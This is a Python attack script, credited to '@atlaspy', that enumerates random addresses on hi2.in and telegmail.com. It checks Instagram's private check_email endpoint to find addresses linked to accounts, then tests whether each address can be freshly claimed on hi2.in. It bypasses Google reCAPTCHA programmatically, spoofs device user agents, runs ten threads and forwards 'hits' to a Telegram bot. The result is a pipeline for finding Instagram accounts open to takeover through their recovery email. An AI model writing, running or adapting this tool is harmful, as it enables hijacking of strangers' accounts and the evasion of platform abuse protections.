

#------------------@atlaspy--------------------#


import sys
import os
import requests
import string
import random
import time
from threading import Thread, Lock 
import requests
from user_agent import generate_user_agent
from hashlib import md5
from bs4 import BeautifulSoup
import base64
import secrets
from random import choice
from threading import Thread, Lock 
import subprocess
import base64
import uuid
import random
import time
import json
import string
import hashlib

try:
    import h2
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    import h2

try:
    import httpx
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
    import httpx  
import httpx, uuid, time, random, string, uuid, user_agent
try:
   
    import pyfiglet
    from rich.console import Console
    from cfonts import render, say
except ImportError:
    os.system("pip install requests telethon pyfiglet rich cfonts")
    
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
ED='\x1b[38;5;208m'
BLUE = '\033[94m'
Z = '\033[1;31m' 
YELLOW = '\033[1;33m' 
O = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
M = '\033[2;36m'
Y = '\033[1;34m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
B="\033[1;30m" 
R="\033[1;31m" 
G="\033[1;32m" 
Y="\033[1;33m" 
Bl="\033[1;34m" 
P="\033[1;35m" 
C="\033[1;36m" 
W="\033[1;37m" 
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
Y = '\033[1;34m' 
M = '\x1b[1;37m'
U = '\x1b[1;37m'
X = '\033[1;33m' 
Y = '\033[1;34m' 
M = '\x1b[1;37m'
S = '\033[1;33m'
R = '\033[1;31m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
J = '\033[2;36m'
N = '\033[1;37m'
GRY =   '\x1b[38;5;46m'
import json




token = input("Token: ")
print("\n")
ID = input(" Id: ")

os.system("clear")

used_usernames = set()
lock = Lock()
hit = 0
badig = 0
badmil = 0
goodig = 0
bad_user = 0
dead = 0


def stat():
    global hit, badig, badmil
    hits = hit
    bad_insta = badig
    bad_mail = badmil
    status = f"\r       {GRY}Hits\033[0m: {hits} // \033[31mBad İnsta\033[0m: {bad_insta} // \033[33mBad Mail\033[0m: {bad_mail}  \r"
    sys.stdout.write(status)
    sys.stdout.flush()

def generate_android_ua():
    devices = [
        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
        {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825", "cpu": "exynos1280"},
        {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama", "cpu": "qcom"},
        {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven", "cpu": "gs101"},
        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
        {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
        {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150", "cpu": "qcom"},
        {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845", "cpu": "qcom"},
        {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893", "cpu": "mtk"},
        {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980", "cpu": "hisilicon"},
    ]
    
    device = random.choice(devices)
    
    android_version = random.choice(["10", "11", "12", "13", "14"])
    api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
    dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
    width = random.choice(["720", "1080", "1440"])
    height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
    instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
    locale = random.choice(["en_US", "en_GB", "ar_SA"])
    random_num = random.randint(300000000, 400000000)
    
    ua = (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
          f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
          f"{device['device']}; {device['board']}; {locale}; {random_num})")
    return ua
    
def info(user):
    global hit
    hit += 1
    stat()
    try:
        msg = f'''
⋘─────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏━─────⋙   
Email: {user}
⋘─────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏━─────⋙  
Dev @Atlaspy  •  @AtlasPython
'''
        with open('hits1.txt', 'a') as ff:
            ff.write(f'{msg}\n')
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
        except:
            pass
    except:
        pass            
            
def solve_recaptcha():
    try:
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
        params = anchor_url.split('?')[1]
        r = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{params}', timeout=10)
        token = r.text.split('recaptcha-token" value="')[1].split('"')[0]
        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible"
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{params}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        resp = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=payload, headers=headers)
        return resp.text.split('resp","')[1].split('"')[0]
    except:
        return None

def check_email(email):
    global badmil
    user = email
    if "@" in email:
        domain = email.split("@")[1]
        email = email.split("@")[0]
    solve = solve_recaptcha() 
    
    data = {
        'domain': domain,
        'prefix': email,
        'recaptcha': solve,
    }

    headers = {
        'User-Agent': "Mozilla/5.0",
        'Accept': "application/json, text/plain, */*",
        'authorization': "Basic bnVsbA==",
    }

    response = requests.post("https://hi2.in/api/custom", data=data, headers=headers)
    res = response.json()
    
    if "already taken" in str(res):
        badmil += 1
        stat()
    else:
        info(user)    	

def rest(email):
    global badig, hit, badmil
    try:
        stat()
        
        pp = '0' 
        if pp == '0':            	
            url = "https://i.instagram.com/api/v1/users/check_email/"   
            response = httpx.Client(http2=True).post(url, data=f"email={email}", headers={'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)", 'content-type': "application/x-www-form-urlencoded; charset=UTF-8"})
            
            if 'email_is_taken' in response.text:
                check_email(email)
                stat()
            else:
                badig += 1
                stat()
    except Exception as e:
        pass
            
def users():    
    while True:
        user1 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
        user2 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
        chosen_user = random.choice([user1, user2])
              
        with lock:
            if chosen_user in used_usernames:
                continue
            used_usernames.add(chosen_user)
        chos = random.choice(["@hi2.in", "@telegmail.com"])
        email = chosen_user + chos
        rest(email)

for _ in range(10):
    Thread(target=users).start()